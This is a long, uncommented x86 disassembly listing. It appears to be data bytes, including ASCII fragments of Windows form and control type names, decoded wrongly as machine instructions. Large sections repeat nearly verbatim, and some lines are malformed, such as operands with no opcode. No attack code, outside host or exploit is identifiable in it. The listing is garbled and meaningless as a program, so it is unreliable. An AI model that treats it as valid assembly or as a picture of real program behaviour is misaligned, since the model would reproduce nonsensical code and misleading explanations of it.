jo r-xdata
add [ gs : eax ] eax
add [ eax ] al
add [ edx ] al
add [ eax ] al
add al al
arpl [ ecx + 0x6c ] sp
inc ebx
outsb
je r-xdata
jo r-xdata
je r-xdata
outsd
push esp
jo r-xdata
dec esi
outsd
outsb
push cs
inc ebx
insb
outsd
inc ebp
jbe r-xdata
inc ebp
jbe r-xdata
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
add [ ecx + edx ] al
inc eax
add [ eax ] cl
cmp eax 0x408d0046
add [ eax + 0x800463d ] bl
adc [ ebx + eax * 2 + 0x6c ] dl
outsd
jae r-xdata
inc ebx
insb
push eax
jb r-xdata
jb r-xdata
outsd
outsb
imul esi [ edi + ebp * 2 + 0x72 ] 0x1
add [ eax ] eax
add [ eax ] al
add [ ebx ] al
inc ecx
arpl [ ecx + ebp * 2 + 0x76 ] si
or al 0x64
insd
add [ eax ] eax
add [ eax ] al
outsb
je r-xdata
bound ebp [ ecx + 0x48 ]
outsb
push esp
outsd
jo r-xdata
add [ esi ] al
jne r-xdata
cmp al 0x46
push esp
push eax
dec edi
ja r-xdata
outsb
je r-xdata
jb r-xdata
outsd
add [ ebx ] al
andps xmm0 [ ebp + 0x66 ]
inc esi
adc [ eax + 0x6f ] esi
jo r-xdata
insd
popad
outsb
add al 0x57
outsd
jb r-xdata
pop es
inc edx
outsd
outsd
insb
popad
outsb
add [ ecx + edx ] al
inc eax
add [ eax ] al
adc [ eax ] al
nop
fdivr [ 0xe080046 ]
push esp
push ebx
push 0x4374726f
jne r-xdata
jae r-xdata
outsb
je r-xdata
outsd
insb
popad
outsb
outsb
je r-xdata
outsd
outsd
insb
push ecx
jne r-xdata
jae r-xdata
jo r-xdata
push es
arpl [ ecx + 0x46 ] sp
jb r-xdata
imul ebp [ esi + 0x46 ] 0xc6d726f
insd
jb r-xdata
jb r-xdata
lea eax [ eax ]
insb
cmp eax [ esi ]
add ecx [ ebx ]
push esp
inc edx
outsd
inc esi
outsd
jb r-xdata
jb r-xdata
add [ eax ] al
add [ eax ] cl
cmp eax 0x63060046
inc esi
outsd
jb r-xdata
inc esp
popa
inc esp
popa
jne r-xdata
and [ edx ] eax
mov al 0x6d
inc esi
add [ edi + ebp * 2 + 0x46 ] ah
dec esp
cmp [ esi ] al
in al dx
add [ esp + eax * 2 ] al
popad
je r-xdata
outsb
add [ eax ] dl
inc eax
add [ eax ] al
push 0x3c004010
adc [ eax ] al
add [ eax ] dl
inc eax
add [ ebp + 0x3ebc0040 ] cl
inc esi
add [ eax ] al
add cl [ eax ]
push es
out 0x44 al
add [ esi + 0x22040044 ] bl
inc edx
add [ ebx + edi * 2 + 0x46 ] cl
add ah ah
push ds
inc edx
add ah ch
mov dh 0x46
add [ esp + ebp * 2 ] ah
inc esi
add al ah
push esi
inc ebp
add ah bh
pop ebx
inc ebp
add [ eax + 0x5b ] cl
inc ebp
add al bh
fild [ eax + eax + 0x5c ]
push ecx
inc ebp
add [ eax + edi * 2 ] ch
inc esi
add [ esi + ecx * 2 - 0x24bfffbb ] dl
inc esp
add [ ebx + ebx * 8 + 0x44 ] al
add [ eax ] ah
jns r-xdata
add dl [ ecx ]
add ecx [ ebp + 0x73 ]
push es
push esp
push edi
dec ebp
dec ebx
jns r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x5400463f ] dh
inc ecx
inc esi
add [ eax ] al
add [ eax ] al
cmp al 0x10
inc eax
add [ eax ] al
adc [ eax ] al
lea eax [ eax ]
mov esp 0x463e
jbe r-xdata
popad
outsb
add [ eax ] al
jb r-xdata
jb r-xdata
dec ebp
imul ebp [ esi + 0x69 ] 0x657a696d
add eax 0x6d726f46
jae r-xdata
or ah [ gs : ebx + 0x61 ]
adc [ eax + 0x6f ] esi
cmp eax [ esi ]
add ecx [ ecx ]
push esp
jae r-xdata
insd
outsd
jo r-xdata
add [ eax ] al
sar [ esi + eax * 2 ] 0x0
push es
jae r-xdata
popad
je r-xdata
add ah ch
pop es
dec ecx
outsb
je r-xdata
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ecx + eax + 0x6 ] si
push eax
inc ebp
add [ eax - 0x43ffb966 ] al
bound eax [ ebp ]
inc esp
dec ebp
inc ebp
add [ edi + ebp * 4 + 0x65180046 ] dl
inc esi
add al cl
inc esi
add [ eax + 0x46 ] dh
add [ eax + 0x2c004670 ] dh
jno r-xdata
add [ eax - 0x17 ] cl
inc esp
add [ ebx + edi * 2 + 0xc080046 ] cl
inc ebp
add al ch
dec esi
inc ebp
add [ edi + ecx * 2 + 0x4aa00045 ] ah
inc ebp
add [ eax + 0x2400454f ] cl
imul eax [ esi ] 0x30
add [ esi ] 0x54
and eax 0x8ef40045
inc esi
add [ edx + edx * 4 + 0x46 ] dl
add [ eax ] dl
xchg ecx eax
inc esi
add ah ch
and eax 0x25f00045
inc ebp
add [ ebx + edx * 4 + 0x24500046 ] cl
inc ebp
add al cl
xchg edx eax
inc esi
add [ esp + ebx * 8 - 0x17efffbc ] bh
inc esp
add [ ebx + edi * 2 ] dl
inc esi
add al ah
jns r-xdata
add [ ebx + ecx - 0x197bffbb ] al
inc esp
dec eax
popad
outsb
insb
pop es
inc edx
pop es
add [ eax ] al
add [ eax ] al
add dl dl
aas
inc esi
add [ edx + 0x41 ] al
inc esi
add al bh
add al [ eax ]
add [ eax + edi + 0x46 ] cl
outsb
je r-xdata
jo r-xdata
inc ebp
jbe r-xdata
push ebx
outsb
jb r-xdata
or [ esi ] al
imul ebp [ edi + 0x6e ] 0x700c6c61
outsd
push eax
jb r-xdata
outsd
jae r-xdata
add [ eax + 0x35 ] ah
inc eax
add al dl
xchg ebx eax
inc esi
add [ edx + esi + 0x32d00040 ] dh
inc eax
add ah cl
outsd
inc esi
add ah cl
pop ebx
inc ebp
add [ esi * 2 - 0x6d0bffba ] bh
inc ecx
add [ ecx + esi * 2 + 0x71c80046 ] cl
inc esi
add ah dl
jb r-xdata
outsd
inc esi
jb r-xdata
add [ ecx + 0x11000200 ] ah
add [ ebx + esi * 4 + 0x46 ] dh
add al ch
insd
inc esi
add [ eax - 0x52 ] bh
inc esi
add [ eax - 0x6b ] bl
inc esi
add [ eax + esi * 4 ] ch
inc esi
add [ eax ] dl
jpo r-xdata
add [ edi ] al
inc ebx
outsd
insd
add eax [ eax ]
pop es
add [ eax ] al
add [ eax ] al
adc [ eax ] al
sbb [ esi ] bh
inc esi
add [ eax ] cl
or dl [ eax + ecx * 2 + 0x65 ]
insb
outsb
je r-xdata
outsb
je r-xdata
jb r-xdata
inc ebx
popad
insb
insb
dec eax
insb
jo r-xdata
or [ ebx + 0x61 ] al
add ch [ eax ]
add [ ecx ] dl
add dl [ ebx ]
and al 0x0
sbb al [ eax ]
inc esi
add [ eax - 0x50 ] al
aas
mov al 0x0
mov al 0x17
mov al 0x3c
mov al 0x1
mov al 0x5
mov al 0xd
mov al 0x10
mov al 0xe
mov al 0x15
mov al 0x19
mov al 0x1d
mov al 0x21
mov al 0x12
mov al 0x29
mov al 0x3d
mov al 0x8
mov al 0x44
mov al 0xb3
push [ edx - 0x13001201 ]
push [ ecx - 0x50004f01 ]
[ esi - 0x52000201 ]
add [ edi ] edx
add [ eax ] esp
add [ edi ] ebx
add [ esi ] eax
add [ eax ] dl
add [ ecx ] dl
add [ edx ] dl
add [ eax ] ebx
add [ edx ] ah
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ ebx ] al
add [ eax ] al
add [ eax + edx + 0x23c0040 ] dl
add [ eax ] al
mov ah 0x3a
inc esi
add [ eax + 0x2 ] dl
add [ eax ] al
call 0x64468609
add al [ eax ]
add [ 0x14000f00 ] bh
add [ edi ] ah
add [ edi ] dh
add [ ecx + 0x200a100 ] al
add [ ecx ] dl
add cl [ eax ]
push es
push ebx
outsb
jb r-xdata
cmp eax 0xb080046
push esp
outsd
inc esi
imul esi [ ebp + eax + 0x46 ] 0x736d726f
pop es
inc edx
outsd
outsd
insb
popad
inc edx
outsd
add [ eax ] ecx
inc ebx
popad
outsb
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ecx + eax + 0x8 ] si
sub_46390c
enter 0x452a 0x0
or [ eax * 2 + 0x454ee800 ] cl
add [ edi + ecx * 2 + 0x4aa00045 ] ah
inc ebp
add [ eax + 0x2400454f ] cl
imul eax [ esi ] 0xfffffff8
inc esi
add [ ebp + 0x45 ] dl
add [ eax + 0x3c004664 ] ch
and al [ ebp ]
mov eax 0xec004664
and eax 0x25f00045
inc ebp
add [ eax + 0x50004524 ] ch
and al 0x45
add al cl
push eax
inc ebp
add [ eax - 0x43ffbad2 ] bl
bound eax [ ebp ]
inc esp
dec ebp
inc ebp
add [ eax + edx * 2 ] dh
inc ebp
add [ eax ] bl
inc esi
add al cl
inc esi
add ah bh
imul eax [ esi ] 0x50006
adc al 0x1
adc eax 0xecb03c01
inc eax
inc [ eax ]
push 0x46
add ah bl
push 0x46
add [ eax ] al
imul eax [ esi ] 0xffffff94
imul eax [ esi ] 0xffffffd8
imul eax [ esi ] sub_466538
adc al 0x54
push ebx
arpl [ edx + 0x6f ] si
insb
insb
imul ebp [ esi + 0x67 ] 0x436e6957
outsd
outsb
je r-xdata
push esi
jb r-xdata
outsd
insb
nop
lodsb [ esi ]
cmp [ esi ] eax
pop es
adc al 0x54
push ebx
arpl [ edx + 0x6f ] si
insb
insb
imul ebp [ esi + 0x67 ] 0x436e6957
outsd
outsb
je r-xdata
add [ ebx ] al
or al 0x54
push ebx
arpl [ edx + 0x6f ] si
jb r-xdata
outsd
insb
cwde
cmp [ esi ] al
push 0xd0044ac
add [ 0x6d726f46 ] al
jae r-xdata
shl ecx 0x2
int 0xda
push edx
rcl [ ecx ] 0x1
sahf
cmpsb [ esi ] [ edi ]
add [ eax ] ah
scasd [ edi ]
cmp eax 0x4605da82
outsd
jb r-xdata
jb r-xdata
or [ gs : edx + 0x73 ] ah
push ebx
imul ebp [ esi + 0x67 ] 0x620a656c
jae r-xdata
cmp al [ esi ]
add edx [ eax ]
push esp
inc esi
outsd
jb r-xdata
jb r-xdata
je r-xdata
inc esi
add [ eax ] cl
add al [ eax ]
push [ eax + 0x1004666 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x480d000b ] al
outsd
jb r-xdata
add [ esi + esi ] bl
inc esi
add [ ebx ] al
add [ eax ] al
add [ eax + 0x3b ] ch
inc esi
add [ edx ] cl
imul edx [ ebx + 0x79 ] 0x6d657473
dec ebp
jae r-xdata
or [ ecx + 0x4f ] cl
insb
inc esi
je r-xdata
jb r-xdata
imul edi [ edx + 0x65 ] 0x656c6261
or [ edx + 0x73 ] ah
inc esp
imul esp [ ecx + 0x6c ] 0x620c676f
insb
add [ gs : eax ] eax
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ edx + edi ] ah
inc esi
add [ 0x6d726f46 ] al
inc edx
outsd
jb r-xdata
inc eax
add [ ecx ] al
jae r-xdata
lea eax [ eax ]
mov eax 0xf00463a
insb
add [ gs : eax ] eax
add [ eax ] al
add [ 0x24000000 ] al
jae r-xdata
push ebx
arpl [ edx + 0x6f ] si
insb
insb
inc edx
popad
jb r-xdata
or ah [ edx + 0x69 ]
dec ebp
bound ebp [ ecx + 0x4d ]
imul ebp [ esi + 0x69 ] 0x657a696d
dec [ ebp + 0x3b1c0040 ]
add bh bh
insd
and al 0x11
inc esi
add [ ebx ] al
lea eax [ eax ]
sbb al 0x3b
or dl [ esi + eax * 2 + 0x6f ]
jb r-xdata
jae r-xdata
outsd
imul ecx [ edx + esi * 2 - 0x5afeffbf ] 0x1d
inc ebx
dec eax
outsd
outsd
outsd
insb
push edi
imul ebp [ esi + 0x64 ] 0x620d776f
jae r-xdata
cmp al [ esi ]
push es
bound esi [ ebx + 0x4e ]
outsd
outsb
add eax 0x24000000
or eax 0x73654449
imul esp [ edi + 0x6e ] 0x6f487265
inc eax
add [ eax + 0xf00463a ] bh
jb r-xdata
jb r-xdata
inc edx
outsd
jb r-xdata
cmp al [ esi ]
add ecx [ esp + edx * 2 ]
jb r-xdata
inc esi
add [ edx + eax ] cl
add bh bh
shl [ esi + 0x46 ] 0x0
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
or al 0x0
or eax 0x74726556
dec edi
insd
imul edi [ edx + 0x65 ] 0x48696206
outsb
jne r-xdata
push ebx
je r-xdata
outsd
jb r-xdata
inc eax
add [ ebx + edi + 0x46 ] ch
add [ ebx ] al
or edx [ edx + eax * 2 + 0x6f ]
push ds
0xa34de72b 0xcc30
imul edi [ edx + 0x65 ] 0x6c6f6f54
push edi
imul ebp [ esi + 0x5 ] 0x6d726f46
inc esi
insb
insb
inc edx
popad
jb r-xdata
push cs
jo r-xdata
mov eax eax
mov esp 0x600463b
inc esi
outsd
jb r-xdata
popad
js r-xdata
bound ebp [ ecx + 0x4d ]
insb
add [ gs : eax ] eax
add [ eax ] al
add [ ebx ] al
add [ eax ] al
add [ eax ] bl
cmp eax [ esi ]
or [ esi + 0x73 ] ah
dec esi
outsd
jb r-xdata
push eax
outsd
jb r-xdata
outsd
push ebx
arpl [ edx + 0x65 ] si
outsb
inc ebx
outsb
je r-xdata
add [ eax ] al
add eax [ eax ]
add [ eax ] al
insb
cmp al 0x46
inc esp
popa
jne r-xdata
jb r-xdata
insb
jns r-xdata
jae r-xdata
insb
jo r-xdata
push es
popad
insb
or ah [ esi + 0x73 ]
dec ebp
jo r-xdata
je r-xdata
inc edx
arpl [ edi + 0x6e ] bp
add [ eax ] eax
add [ eax ] al
or ah [ ebp + ebp * 2 + 0x4d ]
insd
push eax
jo r-xdata
jb r-xdata
je r-xdata
je r-xdata
add [ ecx ] cl
insd
inc esp
jae r-xdata
add [ eax ] al
add [ esp + edi + 0x46 ] ch
je r-xdata
outsb
insb
jns r-xdata
arpl [ edi + 0x6e ] bp
jae r-xdata
pshufw mm5 [ edi + 0x44 ] 0x65
jae r-xdata
jo r-xdata
inc esp
dec ecx
inc ebx
push 0x9646c69
jae r-xdata
sar [ ebx + edi + 0xc060046 ] 0x54
insd
imul edi [ edx + 0x65 ] 0x4d69620a
inc esp
dec ecx
inc esi
outsd
jb r-xdata
inc esi
outsd
dec ebp
popad
imul ebp [ esi + 0x46 ] 0x436d726f
outsb
je r-xdata
outsd
outsb
add [ eax ] eax
add [ eax ] al
add [ edi ] al
add [ eax ] al
add al dl
cmp eax [ esi ]
or dh [ eax + 0x6f ]
inc esp
jae r-xdata
push es
arpl [ ecx + 0x4e ] sp
add eax 0x6d726f46
jae r-xdata
nop
insd
popad
jb r-xdata
adc [ eax + 0x6f ] dh
jo r-xdata
inc esi
outsd
jb r-xdata
jae r-xdata
add ecx [ edi ]
push esp
imul edi [ edx + 0x65 ] 0x796c6e4f
jae r-xdata
cmp eax [ esi ]
nop
aam 0x3b
inc esi
add [ ebx ] al
or [ eax + edx * 2 + 0x6f ] edx
push 0x9000463b
popad
dec ebp
je r-xdata
outsd
jb r-xdata
or esp [ esi + 0x73 ]
push ebx
je r-xdata
jb r-xdata
jb r-xdata
inc esi
outsb
or [ fs : eax + 0x6f ] esi
inc esp
popa
jne r-xdata
cmp al 0x46
inc eax
add [ ebp + edi + 0x46 ] dl
add [ eax ] cl
or edx [ ebx + eax * 2 + 0x6c ]
add [ ebx ] al
cmp al 0x46
add [ ebx ] al
or edx [ eax + edx * 2 + 0x72 ]
imul ebp [ esi + 0x74 ] 0x6c616353
outsd
outsd
outsb
push es
arpl [ ecx + 0x48 ] sp
imul esp [ ebp + 0x6 ] 0x72466163
or ah [ gs : ebx + 0x61 ]
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
popad
dec esi
add [ eax ] al
add [ eax ] al
add eax [ eax ]
add [ eax ] al
or [ 0x63060046 ] bh
inc esp
jae r-xdata
outsb
or al 0x54
inc ebx
insb
outsd
jae r-xdata
add [ esi ] eax
jb r-xdata
or [ ebp + ebp * 2 + 0x50 ] esp
or al 0x3d
inc esi
add [ ebx ] al
or al 0x54
inc ebx
insb
outsd
jae r-xdata
push cs
je r-xdata
jb r-xdata
jo r-xdata
or al 0x54
inc esi
add [ esi ] al
jns r-xdata
add eax 0x6d726f46
jo r-xdata
add [ gs : eax ] eax
add [ eax ] al
add [ edx ] al
add [ eax ] al
add al al
arpl [ ecx + 0x6c ] sp
inc ebx
outsb
je r-xdata
jo r-xdata
je r-xdata
outsd
push esp
jo r-xdata
dec esi
outsd
outsb
push cs
inc ebx
insb
outsd
inc ebp
jbe r-xdata
inc ebp
jbe r-xdata
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
add [ ecx + edx ] al
inc eax
add [ eax ] cl
cmp eax 0x408d0046
add [ eax + 0x800463d ] bl
adc [ ebx + eax * 2 + 0x6c ] dl
outsd
jae r-xdata
inc ebx
insb
push eax
jb r-xdata
jb r-xdata
outsd
outsb
imul esi [ edi + ebp * 2 + 0x72 ] 0x1
add [ eax ] eax
add [ eax ] al
add [ ebx ] al
inc ecx
arpl [ ecx + ebp * 2 + 0x76 ] si
or al 0x64
insd
add [ eax ] eax
add [ eax ] al
outsb
je r-xdata
bound ebp [ ecx + 0x48 ]
outsb
push esp
outsd
jo r-xdata
add [ esi ] al
jne r-xdata
cmp al 0x46
push esp
push eax
dec edi
ja r-xdata
outsb
je r-xdata
jb r-xdata
outsd
add [ ebx ] al
andps xmm0 [ ebp + 0x66 ]
inc esi
adc [ eax + 0x6f ] esi
jo r-xdata
insd
popad
outsb
add al 0x57
outsd
jb r-xdata
pop es
inc edx
outsd
outsd
insb
popad
outsb
add [ ecx + edx ] al
inc eax
add [ eax ] al
adc [ eax ] al
nop
fdivr [ 0xe080046 ]
push esp
push ebx
push 0x4374726f
jne r-xdata
jae r-xdata
outsb
je r-xdata
outsd
insb
popad
outsb
outsb
je r-xdata
outsd
outsd
insb
push ecx
jne r-xdata
jae r-xdata
jo r-xdata
push es
arpl [ ecx + 0x46 ] sp
jb r-xdata
imul ebp [ esi + 0x46 ] 0xc6d726f
insd
jb r-xdata
jb r-xdata
lea eax [ eax ]
insb
cmp eax [ esi ]
add ecx [ ebx ]
push esp
inc edx
outsd
inc esi
outsd
jb r-xdata
jb r-xdata
add [ eax ] al
add [ eax ] cl
cmp eax 0x63060046
inc esi
outsd
jb r-xdata
inc esp
popa
inc esp
popa
jne r-xdata
and [ edx ] eax
mov al 0x6d
inc esi
add [ edi + ebp * 2 + 0x46 ] ah
dec esp
cmp [ esi ] al
in al dx
add [ esp + eax * 2 ] al
popad
je r-xdata
outsb
add [ eax ] dl
inc eax
add [ eax ] al
push 0x3c004010
adc [ eax ] al
add [ eax ] dl
inc eax
add [ ebp + 0x3ebc0040 ] cl
inc esi
add [ eax ] al
add cl [ eax ]
push es
out 0x44 al
add [ esi + 0x22040044 ] bl
inc edx
add [ ebx + edi * 2 + 0x46 ] cl
add ah ah
push ds
inc edx
add ah ch
mov dh 0x46
add [ esp + ebp * 2 ] ah
inc esi
add al ah
push esi
inc ebp
add ah bh
pop ebx
inc ebp
add [ eax + 0x5b ] cl
inc ebp
add al bh
fild [ eax + eax + 0x5c ]
push ecx
inc ebp
add [ eax + edi * 2 ] ch
inc esi
add [ esi + ecx * 2 - 0x24bfffbb ] dl
inc esp
add [ ebx + ebx * 8 + 0x44 ] al
add [ eax ] ah
jns r-xdata
add dl [ ecx ]
add ecx [ ebp + 0x73 ]
push es
push esp
push edi
dec ebp
dec ebx
jns r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x5400463f ] dh
inc ecx
inc esi
add [ eax ] al
add [ eax ] al
cmp al 0x10
inc eax
add [ eax ] al
adc [ eax ] al
lea eax [ eax ]
mov esp 0x463e
jbe r-xdata
popad
outsb
add [ eax ] al
jb r-xdata
jb r-xdata
dec ebp
imul ebp [ esi + 0x69 ] 0x657a696d
add eax 0x6d726f46
jae r-xdata
or ah [ gs : ebx + 0x61 ]
adc [ eax + 0x6f ] esi
cmp eax [ esi ]
add ecx [ ecx ]
push esp
jae r-xdata
insd
outsd
jo r-xdata
add [ eax ] al
sar [ esi + eax * 2 ] 0x0
push es
jae r-xdata
popad
je r-xdata
add ah ch
pop es
dec ecx
outsb
je r-xdata
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ecx + eax + 0x6 ] si
push eax
inc ebp
add [ eax - 0x43ffb966 ] al
bound eax [ ebp ]
inc esp
dec ebp
inc ebp
add [ edi + ebp * 4 + 0x65180046 ] dl
inc esi
add al cl
inc esi
add [ eax + 0x46 ] dh
add [ eax + 0x2c004670 ] dh
jno r-xdata
add [ eax - 0x17 ] cl
inc esp
add [ ebx + edi * 2 + 0xc080046 ] cl
inc ebp
add al ch
dec esi
inc ebp
add [ edi + ecx * 2 + 0x4aa00045 ] ah
inc ebp
add [ eax + 0x2400454f ] cl
imul eax [ esi ] 0x30
add [ esi ] 0x54
and eax 0x8ef40045
inc esi
add [ edx + edx * 4 + 0x46 ] dl
add [ eax ] dl
xchg ecx eax
inc esi
add ah ch
and eax 0x25f00045
inc ebp
add [ ebx + edx * 4 + 0x24500046 ] cl
inc ebp
add al cl
xchg edx eax
inc esi
add [ esp + ebx * 8 - 0x17efffbc ] bh
inc esp
add [ ebx + edi * 2 ] dl
inc esi
add al ah
jns r-xdata
add [ ebx + ecx - 0x197bffbb ] al
inc esp
dec eax
popad
outsb
insb
pop es
inc edx
pop es
add [ eax ] al
add [ eax ] al
add dl dl
aas
inc esi
add [ edx + 0x41 ] al
inc esi
add al bh
add al [ eax ]
add [ eax + edi + 0x46 ] cl
outsb
je r-xdata
jo r-xdata
inc ebp
jbe r-xdata
push ebx
outsb
jb r-xdata
or [ esi ] al
imul ebp [ edi + 0x6e ] 0x700c6c61
outsd
push eax
jb r-xdata
outsd
jae r-xdata
add [ eax + 0x35 ] ah
inc eax
add al dl
xchg ebx eax
inc esi
add [ edx + esi + 0x32d00040 ] dh
inc eax
add ah cl
outsd
inc esi
add ah cl
pop ebx
inc ebp
add [ esi * 2 - 0x6d0bffba ] bh
inc ecx
add [ ecx + esi * 2 + 0x71c80046 ] cl
inc esi
add ah dl
jb r-xdata
outsd
inc esi
jb r-xdata
add [ ecx + 0x11000200 ] ah
add [ ebx + esi * 4 + 0x46 ] dh
add al ch
insd
inc esi
add [ eax - 0x52 ] bh
inc esi
add [ eax - 0x6b ] bl
inc esi
add [ eax + esi * 4 ] ch
inc esi
add [ eax ] dl
jpo r-xdata
add [ edi ] al
inc ebx
outsd
insd
add eax [ eax ]
pop es
add [ eax ] al
add [ eax ] al
adc [ eax ] al
sbb [ esi ] bh
inc esi
add [ eax ] cl
or dl [ eax + ecx * 2 + 0x65 ]
insb
outsb
je r-xdata
outsb
je r-xdata
jb r-xdata
inc ebx
popad
insb
insb
dec eax
insb
jo r-xdata
or [ ebx + 0x61 ] al
add ch [ eax ]
add [ ecx ] dl
add dl [ ebx ]
and al 0x0
sbb al [ eax ]
inc esi
add [ eax - 0x50 ] al
aas
mov al 0x0
mov al 0x17
mov al 0x3c
mov al 0x1
mov al 0x5
mov al 0xd
mov al 0x10
mov al 0xe
mov al 0x15
mov al 0x19
mov al 0x1d
mov al 0x21
mov al 0x12
mov al 0x29
mov al 0x3d
mov al 0x8
mov al 0x44
mov al 0xb3
push [ edx - 0x13001201 ]
push [ ecx - 0x50004f01 ]
[ esi - 0x52000201 ]
add [ edi ] edx
add [ eax ] esp
add [ edi ] ebx
add [ esi ] eax
add [ eax ] dl
add [ ecx ] dl
add [ edx ] dl
add [ eax ] ebx
add [ edx ] ah
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ ebx ] al
add [ eax ] al
add [ eax + edx + 0x23c0040 ] dl
add [ eax ] al
mov ah 0x3a
inc esi
add [ eax + 0x2 ] dl
add [ eax ] al
call 0x64468609
add al [ eax ]
add [ 0x14000f00 ] bh
add [ edi ] ah
add [ edi ] dh
add [ ecx + 0x200a100 ] al
add [ ecx ] dl
add cl [ eax ]
push es
push ebx
outsb
jb r-xdata
cmp eax 0xb080046
push esp
outsd
inc esi
imul esi [ ebp + eax + 0x46 ] 0x736d726f
pop es
inc edx
outsd
outsd
insb
popad
inc edx
outsd
add [ eax ] ecx
inc ebx
popad
outsb
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ecx + eax + 0x8 ] si
sub_464178
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
rol [ edx + 0x46 ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov ah 0x42
inc esi
add al bh
add al [ eax ]
add [ eax + 0x3e ] dh
inc esi
add ah ch
and [ edx ] eax
mov al 0x6d
inc esi
add [ edi + ebp * 2 + 0x46 ] ah
add [ eax + 0x35 ] ah
inc eax
add al dl
xchg ebx eax
inc esi
add [ edx + esi + 0x32d00040 ] dh
inc eax
add ah cl
outsd
inc esi
add ah cl
pop ebx
inc ebp
add [ esi * 2 - 0x6d0bffba ] bh
inc ecx
add [ ecx + esi * 2 + 0x71c80046 ] cl
inc esi
add ah dl
jb r-xdata
out 0x44 al
add [ esi + 0x22040044 ] bl
inc edx
add [ ebx + edi * 2 + 0x46 ] cl
add ah ah
push ds
inc edx
add ah ch
mov dh 0x46
add [ esp + ebp * 2 ] ah
inc esi
add al ah
push esi
inc ebp
add ah bh
pop ebx
inc ebp
add [ eax + 0x5b ] cl
inc ebp
add al bh
fild [ eax + eax + 0x5c ]
push ecx
inc ebp
add [ eax + edi * 2 ] ch
inc esi
add [ esi + ecx * 2 - 0x24bfffbb ] dl
inc esp
add [ ebx + ebx * 8 + 0x44 ] al
add [ eax ] ah
jns r-xdata
push eax
inc ebp
add [ eax - 0x43ffb966 ] al
bound eax [ ebp ]
inc esp
dec ebp
inc ebp
add [ edi + ebp * 4 + 0x65180046 ] dl
inc esi
add al cl
inc esi
add [ eax + 0x46 ] dh
add [ eax + 0x2c004670 ] dh
jno r-xdata
add [ eax - 0x17 ] cl
inc esp
add [ ebx + edi * 2 + 0xc080046 ] cl
inc ebp
add al ch
dec esi
inc ebp
add [ edi + ecx * 2 + 0x4aa00045 ] ah
inc ebp
add [ eax + 0x2400454f ] cl
imul eax [ esi ] 0x30
add [ esi ] 0x54
and eax 0x8ef40045
inc esi
add [ edx + edx * 4 + 0x46 ] dl
add [ eax ] dl
xchg ecx eax
inc esi
add ah ch
and eax 0x25f00045
inc ebp
add [ ebx + edx * 4 + 0x24500046 ] cl
inc ebp
add al cl
xchg edx eax
inc esi
add [ esp + ebx * 8 - 0x17efffbc ] bh
inc esp
add [ ebx + edi * 2 ] dl
inc esi
add al ah
jns r-xdata
add [ ebx + ecx - 0x197bffbb ] al
inc esp
sub ah bl
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4106000d ] al
arpl [ ecx + ebp * 2 + 0x6f ] si
add [ ebx + esi * 4 + 0x46 ] dh
add al ch
insd
inc esi
add [ eax - 0x52 ] bh
inc esi
add [ eax - 0x6b ] bl
inc esi
add [ eax + esi * 4 ] ch
inc esi
add [ eax ] dl
jpo r-xdata
add [ edi ] cl
inc ecx
insb
jo r-xdata
inc ebx
outsd
outsb
push 0x200044ac
add al [ eax ]
push [ esp + edx * 4 ]
inc esi
add [ esi + eax * 4 + 0x46 ] dh
add [ eax - 0x80000000 ] al
push cs
add [ 0x69746341 ] cl
jbe r-xdata
add [ 0x726f4654 ] al
insd
mov eax eax
rol [ edx + 0x46 ] 0x0
pop es
add eax 0x726f4654
insd
rol [ ecx + 0x46 ] 0x0
push eax
inc ecx
inc esi
add [ esi ] bl
add eax 0x6d726f46
jae r-xdata
add [ eax ] al
adc al 0x0
or [ ecx + 0x75 ] al
je r-xdata
popad
inc edx
insb
outsb
push esi
popad
insb
jne r-xdata
cwde
inc esp
add [ ecx ] ah
add bh bh
or ah bl
inc esp
add [ esp + ebx * 8 + 0x44 ] ah
add [ eax + 0x3 ] al
outsd
insb
test al 0x91
inc esp
add [ ebx ] bl
add bh bh
enter 0x44dd 0x0
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
sldt [ 0x67696c41 ]
outsb
add [ eax ] dl
inc eax
add al ah
add al [ eax ]
dec [ eax - 0x48 ]
inc esi
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
adc [ eax ] al
or al [ ecx + 0x6c ]
jo r-xdata
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add al bh
jne r-xdata
je r-xdata
push ebx
imul edi [ edx + 0x65 ] r-xdata
pop edi
add [ eax ] al
push [ eax ]
add dh bh
fsubr st1
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x42080015 ] al
imul eax [ ecx + ebp * 2 + 0x4d ] 0xb865646f
cmp eax [ esi ]
sub [ edx ] al
add bh bh
outsd
adc al [ eax ]
pop es
inc ecx
outsb
arpl [ eax + 0x6f ] bp
jb r-xdata
call 0x6146882e
add [ eax ] al
dec [ eax ]
fadd [ eax + eax - 0x5c ]
fadd [ eax + eax ]
add [ eax ] al
add [ ebx ] 0x0
add [ eax ] al
mov esp 0xb4004683
xchg [ esi ] al
add [ eax ] al
add [ eax + 0x7 ] al
push ss
add [ ebx ] cl
inc edx
outsd
jb r-xdata
add [ eax ] dl
inc eax
